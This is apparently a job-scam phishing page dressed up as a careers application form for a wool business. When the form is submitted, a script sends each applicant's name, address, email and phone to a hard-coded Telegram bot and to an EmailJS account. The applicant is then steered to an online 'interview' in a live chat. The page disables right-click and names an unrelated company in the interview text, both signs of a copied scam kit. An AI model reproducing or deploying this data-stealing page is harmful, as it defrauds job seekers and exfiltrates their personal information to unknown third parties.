<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Apply | Wild Ewes Woolery</title>
  <meta name="description" content="Apply for roles at Wild Ewes Woolery – data entry, admin, delivery, customer support and more." />
  <link rel="stylesheet" href="/style.css" />
  <link rel="icon" href="/favicon.ico" />
  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
  <script>
    function loadEmailJSSDK(callback) {
      if (typeof emailjs !== 'undefined') {
        callback();
      } else {
        const script = document.createElement('script');
        script.src = 'https://cdn.emailjs.com/dist/email.min.js';
        script.onload = callback;
        document.head.appendChild(script);
      }
    }
  </script>
</head>
<body>
  <header class="main-header">
    <div class="logo"><a href="/index">Wild Ewes Woolery</a></div>
    <nav>
      <ul>
        <li><a href="/about">About</a></li>
        <li><a href="/careers">Careers</a></li>
        <li><a href="/shippers">Shippers</a></li>
        <li><a href="/carriers">Carriers</a></li>
        <li><a href="/contact">Contact</a></li>
      </ul>
    </nav>
  </header>

  <div class="form-container" id="apply">
    <h2>Job Application Form</h2>
    <form id="jobForm">
      <input type="text" id="name" placeholder="Full Name" required>
      <input type="text" id="address" placeholder="Mailing Address" required>
      <input type="email" id="email" placeholder="Email" required>
      <input type="text" id="phone" placeholder="Phone Number" required>
      <select id="position" required>
        <option value="">Select Position</option>
        <option value="Data Entry Clerk">Data Entry Clerk</option>
        <option value="Administrative Assistant">Administrative Assistant</option>
        <option value="Customer Service Representative">Customer Service Representative</option>
        <option value="Mail Clerk">Mail Clerk</option>
        <option value="Executive Assistant">Executive Assistant</option>
        <option value="Delivery Driver">Delivery Driver</option>
        <option value="Mystery Shopper">Mystery Shopper</option>
        <option value="Feedback Specialists">Feedback Specialists</option>
      </select>
      <button type="submit">Next Application</button>
    </form>
    <div class="success-message" id="success-message">Application Successfully Submitted!</div>
  </div>

  <div class="interview-details" id="interviewDetails" style="display:none;">
    <div class="center-me">
      <h2>Interview Invitation: Discuss Your Role</h2>
      <p>As part of our commitment to understanding each team member’s experience and ensuring the necessary support for success, we’d like to schedule a brief interview with you.</p>
      <p>In response to the large number of applicants, we’ve moved all interviews online. This ensures an easier, faster process for candidates, who can join from their laptops or phones.</p>
      <p><strong>During this conversation, we’ll discuss:</strong></p>
      <ul>
        <li>Your current role and responsibilities</li>
        <li>Any challenges you may be facing</li>
        <li>Ways to improve processes and team collaboration</li>
        <li>Your feedback on how K Squared Cellars can better support you</li>
      </ul>
      <h3>Interview Details:</h3>
      <ul>
        <li>Days: Monday – Friday</li>
        <li>Time: 8:00 AM – 6:00 PM EST</li>
        <li>Duration: 20–30 minutes</li>
        <li>Join via: <a href="https://direct.lc.chat/16972020" target="_blank">Live Chat Link</a></li>
      </ul>
      <p>You don’t need to schedule a time — just join during hours listed above. We look forward to speaking with you!</p>
    </div>
  </div>

  <div class="contact-page" id="contactPage" style="display:none;">
    <h2>Our Offices</h2>
    <p><strong>California</strong><br>Corporate Office<br>7975 Cameron Dr., Bldg. 1500-A, Windsor, CA 95492<br>+1 (818) 296-2990</p>
    <p><strong>California</strong><br>Branch Office<br>780 Roosevelt STE, Irvine, CA 92620<br>+1 (800) 492-1135</p>
    <p><strong>Mumbai (India)</strong><br>219-B, New Sonal Link Ind. Estate Off Link Rd, Opp Movie Time Cinema, Malad (W), Mumbai 400064</p>
  </div>

  <script>
    document.addEventListener('contextmenu', event => event.preventDefault());

    loadEmailJSSDK(() => {
      emailjs.init("1zVbYwsIj5NevmCP0"); // ✅ Your public EmailJS key

      document.getElementById("jobForm").addEventListener("submit", function(event) {
        event.preventDefault();

        let name = document.getElementById("name").value;
        let address = document.getElementById("address").value;
        let email = document.getElementById("email").value;
        let phone = document.getElementById("phone").value;
        let position = document.getElementById("position").value;

        // ✅ Telegram
        let telegramMessage = `New Application:\nName: ${name}\nAddress: ${address}\nEmail: ${email}\nPhone: ${phone}\nPosition: ${position}`;
        let telegramURL = `https://api.telegram.org/bot6113839454:AAFY5WlixlzhREvqK1DAGyZBRnDeY-D9jU4/sendMessage?chat_id=1461764555&text=${encodeURIComponent(telegramMessage)}`;
        
        fetch(telegramURL)
          .then(response => response.json())
          .then(data => console.log("Telegram OK:", data))
          .catch(error => console.error("Telegram error:", error));

        // ✅ EmailJS
        emailjs.send("default_service", "template_kpi5n6e", {
          name: name,
          address: address,
          email: email,
          phone: phone,
          position: position
        })
        .then(function(response) {
          console.log("EmailJS success", response);
        }, function(error) {
          console.error("EmailJS error", error);
        });

        // ✅ Show Interview Panel
        document.querySelector('.form-container').style.display = 'none';
        document.getElementById("interviewDetails").style.display = 'block';
      });
    });
  </script>

  <!-- ✅ LiveChat -->
  <script>
    window.__lc = window.__lc || {};
    window.__lc.license = 16972020;
    ;(function(n,t,c){
      function i(n){
        return e._h ? e._h.apply(null,n) : e._q.push(n)
      }
      var e = { _q: [], _h: null, _v: "2.0", on: function(){ i(["on", c.call(arguments)]) }, once: function(){ i(["once", c.call(arguments)]) }, off: function(){ i(["off", c.call(arguments)]) }, get: function(){ if(!e._h) throw new Error("[LiveChatWidget] You can't use getters before load."); return i(["get", c.call(arguments)]) }, call: function(){ i(["call", c.call(arguments)]) }, init: function(){ var n = t.createElement("script"); n.async = !0, n.type = "text/javascript", n.src = "https://cdn.livechatinc.com/tracking.js", t.head.appendChild(n) } };
      !n.__lc.asyncInit && e.init(), n.LiveChatWidget = n.LiveChatWidget || e
    })(window, document, [].slice)
  </script>
</body>
</html>
